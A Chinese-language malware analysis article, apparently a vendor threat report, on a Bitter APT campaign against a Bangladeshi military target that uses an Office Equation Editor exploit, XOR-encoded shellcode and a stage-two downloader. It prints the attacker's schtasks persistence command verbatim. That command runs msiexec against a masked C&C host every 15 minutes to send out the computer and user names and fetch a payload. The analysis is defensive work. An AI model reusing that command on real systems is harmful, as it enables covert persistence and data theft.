---
title: APT组织Bitter网络间谍攻击活动实例分析
url: https://mp.weixin.qq.com/s?__biz=MjM5Njc3NjM4MA==&mid=2651121522&idx=2&sn=acda2008af0318adcbc05a58cd67af92&chksm=bd1457a18a63deb7cab1550e45c4fa660c1132d1f31f383e6a612e6b2eb48121201f650ff672&scene=58&subscene=0#rd
source: 安全牛
date: 2023-01-14
fetch_date: 2025-10-04T03:53:21.107150
---

# APT组织Bitter网络间谍攻击活动实例分析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc5l0lEvenzpxibK03DPibLuODF0R0PibPA1NwGozo4fpNnwlV0D7KrmY0Ag/0?wx_fmt=jpeg)

# APT组织Bitter网络间谍攻击活动实例分析

中孚信息

安全牛

Bitter(T-APT-17、BITTER、蔓灵花)组织是一个长期针对中国、巴基斯坦等国家进行攻击活动的南亚地区APT组织，因其早期使用的特种木马通信的数据包头部以“BITTER”作为标识而得名。该组织主要针对政府、军工、能源等单位进行攻击以窃取敏感数据，具有强烈的政治背景。

近日，中孚信息威胁研究人员分析了该组织近期一次针对孟加拉国军事机构的攻击活动，攻击者通过利用Office的公式编辑器组件（EQNEDT32.EXE）漏洞，投放恶意诱饵文档和中间恶意软件来部署远程访问木马，进行网络间谍活动。

攻击流程

EQNEDT32.EXE是Office办公软件内的一个公式编辑器组件，该组件存在多个隐藏了很久的远程代码执行漏洞，攻击者可以在office文档中嵌入恶意的公式数据发起攻击，用户打开恶意文档就会中招。

第一阶段，攻击者通过利用具有Office的公式编辑器组件漏洞的恶意文档作为诱饵，诱导用户打开，从而触发漏洞执行恶意shellcode，以下载第二阶段的恶意样本。

第二阶段，攻击者使用了一个名为vc的恶意样本，中孚信息威胁研究人员通过收集受感染计算机名、用户名等敏感信息发送至恶意C&C服务器，创建定时任务以实现持久化操作，并获取下一阶段的恶意载荷。但由于分析时获取载荷的请求已失效无法获取响应内容，所以本文只分析前两阶段的攻击行为。

样本分析（第一阶段）

01

**投递诱饵文档**

第一阶段攻击者使用一个名称为《Repair of different csoc cstc\_ china supplied system - BNS BIJOY.xls》的恶意xls文档作为诱饵诱导受害用户打开以便下载后续的恶意软件，文档信息如下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc5aDxyzKh696nynicicwUCQCoLMjtCqIVJhKbEWD2E3UdKGRItRPs3xPcQ/640?wx_fmt=jpeg)

02

**执行恶意shellcode获取下一阶段载荷**

用Excel打开发现内容为乱码，点击A1A2方块显示的是一个函数=EMBED("Equation. 3",") ，这表明在打开该文档时会调用Equation. 3程序。如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc5Ut4kQkkZcKrWjgd5Met4wuViar2P2Jn95QduFxgYdv3R1S9Tic1IZSEg/640?wx_fmt=png)

使用Process Monitor工具监控进程行为，发现打开文档后会启动EQNEDT32.EXE程序以便来执行恶意shellcode。

![](https://mmbiz.qpic.cn/mmbiz_png/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc5vk6lkn1kY87LrEfF1e3zic4WBM0ZLQ1ibb38dKYevpaHIsDq4ATglicTw/640?wx_fmt=png)

使用Burpsuite抓包发现打开恶意文档后会发起请求http://\*\*\*.com/vc/vc来获取第二阶段的payload。

![](https://mmbiz.qpic.cn/mmbiz_png/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc5PgkCZbttrUDe97BHlpxVmcGQLESVsvDPYCPibCVEvFql9ibQCBpNUtVA/640?wx_fmt=png)

使用Process Monitor的进程树可以看到下载下来的第二阶段的恶意程序会被移动至C:\\$Drw目录下，并重命名为fsutil.exe，然后由EQNEDT32.EXE程序调用explorer.exe来启动该程序。

![](https://mmbiz.qpic.cn/mmbiz_png/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc5f8uPR5fKTJC2WLOvwclyxFKWqJk5JSiaIRXA5VwvJ9ECUnpzI5MYrKQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc5pyToWX5ah8TMmZGJMMI1aqPyEOQB3JOLjarYiat2tDRhtB98Igyd9dg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc5eKWjK2BibVMgr9fcSE8AFYhTv8iaWbUF5KW7ppJaNuToj7iaHhtJ6Cetw/640?wx_fmt=png)

中孚信息威胁研究人员利用oledump查看文档结构发现有如下图所示的几部分组成，将名称为“Equation Native”的部分dump下来，这部分即为攻击者嵌入的恶意shellcode。

![](https://mmbiz.qpic.cn/mmbiz_png/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc5NfqEEKO7RBMT2yQZoick5cFluEAG18ezrGor0T8libCU6VtdHaHog61Q/640?wx_fmt=png)

03

**使用FF作为XOR key对shellcode进行编码**

2019年Sophos Labs的一份报告中曾分析了一个利用CVE-2018-0798漏洞的maldoc构造器，该构造器使用xor运算对shellcode进行编码。中孚信息威胁研究人员使用二进制编辑工具查看dump的二进制文件，统计发现字节“FF”出现次数较高，猜测可能使用该字节进行异或操作。

![](https://mmbiz.qpic.cn/mmbiz_png/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc5Ue5MAA7V3rXj6DoRGFCuAKKjIJayellCG0ee6abnqVDicPnlbluZRLQ/640?wx_fmt=png)

将原二进制内容与FF进行异或操作，可看到一些明显的字符串，包括urlmon.dll和下载第二阶段payload的url：\*\*\*.com/vc/vc等。

![](https://mmbiz.qpic.cn/mmbiz_jpg/kuIKKC9tNkCnibOHmw1sBT89CHVB94OXVZOkzhd94rAbICmTLQcs5SbL4wcCrzdhXuicadAhjyyntDuAnF0J4DwA/640?wx_fmt=jpeg)

04

**获取下一阶段载荷**

接下来使用x32dbg联合gflags.exe来调试EQNEDT32.EX执行恶意shellcode的过程。

![](https://mmbiz.qpic.cn/mmbiz_png/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc58aA99iaNMJaNn0OHs8tYI4mvZyQ9KlpDvFAEfbn7AjD47BgEw7A3xaQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc5Ul3RicZUTibqt5a7zOtcLUYG58R6rgdhCwECOHia7XQKd1Z1hIbVbHcRA/640?wx_fmt=png)

在urlmon.dll的URLDownloadToFileA API处下断点并运行，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc5rFZFsLhSWNiaTC269fDZh9TQQPSq1r3HfdfeeBlAQ81pXYN3uwTCUhg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc52nZm1DzY8gwkNmVgHTq6LLLXpe7KuJHa5UbgmItkBZbEIwDkzLicUNw/640?wx_fmt=png)

运行程序直到打断处，可以看到程序停到了上一步打的断点URLDownloadToFileA处，且也可以看到下载第二阶段恶意载荷的url——http://\*\*\*.com/vc/vc。由于分析时该url已经失效无法直接下载恶意载荷。

![](https://mmbiz.qpic.cn/mmbiz_jpg/kuIKKC9tNkCnibOHmw1sBT89CHVB94OXV5zGLyYytKu2jPSy8g4IOiaKSxcvYLAGHnTKLEXYfXuSshpHLygibNL4w/640?wx_fmt=jpeg)

样本分析（第二阶段）

01

**样本信息**

因为分析时下载第二阶段恶意载荷的url已经失效，无法直接下载第二阶段的样本，通过威胁狩猎在微步平台下载了第二阶段的样本并继续分析。样本信息如下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc55iaSfHzfeicTPEfsv1NI3Iyby0vs1q8ehsxDhobGgGtWOg9RG8AibzLjQ/640?wx_fmt=jpeg)

使用PE工具可以看到是一个第二阶段的样本是一个可执行文件，且创建于2022-5-11.

![](https://mmbiz.qpic.cn/mmbiz_png/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc5XhFottQ9yTDT948c9wPgwmeo2BxuxsqQ9TYEYD68UibAqmxHHQSCMsg/640?wx_fmt=png)

02

**解密C&C域名**

利用IDA查看样本中的字符串，可以看到 GET请求及疑似拼接的url字段。

![](https://mmbiz.qpic.cn/mmbiz_png/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc5dU58eGBy0U0d577qwnKTibfSTPR0k7njJvP0Ggqz9JoDqicyFqd6xVaQ/640?wx_fmt=png)

通过调试发现第二阶段的恶意程序首先会解密出恶意C&C域名：m.\*\*\*.com。

![](https://mmbiz.qpic.cn/mmbiz_jpg/kuIKKC9tNkCnibOHmw1sBT89CHVB94OXVjM9hPqjBMDGeZwW5oANyMwTebQ5nNbFQrYdsgGS5NFrGF0SKTXnDmQ/640?wx_fmt=jpeg)

03

**收集受害主机信息发送至C&C服务器**

解密C&C域名后，紧接着便收集受害计算机名称和用户名拼接到请求中并发送到C&C服务器。

![](https://mmbiz.qpic.cn/mmbiz_jpg/kuIKKC9tNkCnibOHmw1sBT89CHVB94OXVxrdn7LbnnyIgncqVs3DeoaXk4LFUXria0ZrTVpf8QjAMX8LNGcgduKg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc5Gw7ibj3O7RDKAsyVRIbWVYMic2deYJWdhzvpMCcj1d3n3dXw58MpCeqg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/kuIKKC9tNkCnibOHmw1sBT89CHVB94OXVuEWodFhDnvmP0DKnKiacnUfruqnq7DNdQlzrfiaqAN8x9wnIuCJbI8AA/640?wx_fmt=jpeg)

恶意样本将收集的信息通过socket发送请求至C&C服务器，但分析时该请求已经失效，无法获取下一阶段的载荷。

![](https://mmbiz.qpic.cn/mmbiz_jpg/kuIKKC9tNkCnibOHmw1sBT89CHVB94OXV0tPlXoFLF8mHPvjPWPiaic9JLEAnj2xwO1d1EkhmDBuaBfhicXzUSBamA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc5KbDZgGwsvepia20Wf8YAxSXHOWsg9fbU1M7uYH3ajF5np5iaic4kicSonQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc57knmtdPZ2Pyyukepvz5GyohhOMBV1TicDeCDA2iaic8mkxicd0kjsSbJjA/640?wx_fmt=png)

04

**设置定时任务以实现持久化操作**

继续调试发现该恶意样本创建了定时任务，任务名称为AdobeUpdater，内容为：schtasks  /create /sc minute /mo 15 /tn AdobeUpdater /tr  "%coMSPec%  /c start /min msiexec /i http://\*\*\*.com/csslogs/vis.php?st=%computername%\*%username% /qn /norestart"  /f，用于每隔15分钟收集计算机名称和用户名并发送至C&C服务器\*\*\*.com，由于分析时请求的URL已经失效，所以无法获取请求后的响应载荷。

![](https://mmbiz.qpic.cn/mmbiz_jpg/kuIKKC9tNkCnibOHmw1sBT89CHVB94OXVoNWESOxRfpcznzicgq3ic3TOFMFkGh1Zk0amk5Em0iakMHyeksHb6KpKg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc5K7FLSic7ovib7wC2lXOOqR4NJKNPOofE00icmh2k0T8gfcX2GOYBm0icqw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/kuIKKC9tNkDAicCNibtJ9bIwNu0xlicglc505iaeVic3eFMYK2yaPfa4L4Q1YJibibPD4yfx8mGz8UIVRnBIFCbKzD8Jg/640?wx_fmt=png)

**结语**

通过分析可以发现，本次攻击主要利用可Office的公式编辑器组件（EQNEDT32.EXE）漏洞，使用恶意文档作为诱饵诱导用户点击查看，从而触发漏洞执行恶意shellcode并下载下一阶段的载荷，收集受感染机器上的计算机名、用户名等敏感信息发送至恶意C&C服务器，并创建计划任务以实现持久化操作，进行其他恶意操作等。

中孚信息分析团队提醒企业用户，切勿打开社交媒体分享的来历不明的链接，不轻易点击执行未知来源的邮件附件，不运行夸张标题的未知文件，不安装非正规途径来源的APP。同时，企业应该及时备份重要文件，更新安装补丁，当发现不明软件应用时，应及时排查、清除。

目前，中孚信息研发的威胁分析系统、中孚绝影APT检测产品、中孚威胁情报平台ZFTIP、中孚猎户座恶意代码检测分析系统均已支持对此类攻击的检测响应，以实战化思维构筑“威胁可感知、告警高置信、攻击可溯源、安全可运营”的全域防御能力体系。

相关阅读

[恶意软件Shamoon将文档变成攻击武器](http://mp.weixin.qq.com/s?__biz=MjM5Njc3NjM4MA==&mid=2651070544&idx=3&sn=d007e1e67aa494d6e193ee65871614a6&chksm=bd1490838a63199586e8c90b9450f52dd01e4a080933a0af84dd58b8b8edc160f6ddc830d4ac&scene=21#wechat_redirect)

[利用“五十度灰”将恶意代码隐藏在PDF文档中](http://mp.weixin.qq.com/s?__biz=MjM5Njc3NjM4MA==&mid=203420186&idx=2&sn=9b895e76629d2025bbe3bb97c60c944c&chksm=2f0f42c91878cbdf8b23feb0f31578ac9625436bdd487665b3514295fc01cc462e7822ae3dc3&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/kuIKKC9tNkAZYNibk7aDDd0hAkQGzOfLPfjXUPaypbuDrr5exabqWXmSOeZVUZtP6zqw9YGWib9xNQdvx1iaCicTUA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

合作电话：18311333376

合作微信：aqniu001

投稿邮箱：editor@aqniu.com

![](https://mmbiz.qpic.cn/mmbiz_gif/kuIKKC9tNkAfZibz9TQ8KWj4voxxxNSGMAGiauAWicdDiaVl8fUJYtSgichibSzDUJvsic9HUfC38aPH9ia3sopypYW8ew/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://m...